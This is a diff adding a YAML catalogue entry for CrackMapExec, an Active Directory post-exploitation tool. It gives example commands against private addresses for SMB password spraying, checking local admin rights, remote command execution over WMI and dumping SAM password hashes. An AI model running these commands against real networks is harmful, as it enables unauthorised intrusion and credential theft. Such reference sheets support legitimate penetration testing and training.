@@ -1,0 +1,22 @@
+name: Crackmapexec
+category: Active Directory & SMB
+function: Active Directory post-exploitation, SMB/WinRM swiss army knife
+description: >
+  CrackMapExec (CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks.
+
+usages:
+  - name: SMB password spray
+    command: crackmapexec smb 192.168.1.0/24 -u users.txt -p Password123
+    explanation: Tests a single password across a list of domain users over SMB.
+
+  - name: Check local admin rights
+    command: crackmapexec smb 192.168.1.0/24 -u admin -p Secret --local-auth
+    explanation: Checks which network hosts grant administrative privileges to local account.
+
+  - name: Execute command via WMI
+    command: crackmapexec smb 192.168.1.10 -u admin -p Secret -x "whoami"
+    explanation: Executes a system shell command remotely over WMI on target host.
+
+  - name: Dump SAM hashes
+    command: crackmapexec smb 192.168.1.10 -u admin -p Secret --sam
+    explanation: Dumps local SAM password hashes from Windows registry remotely.
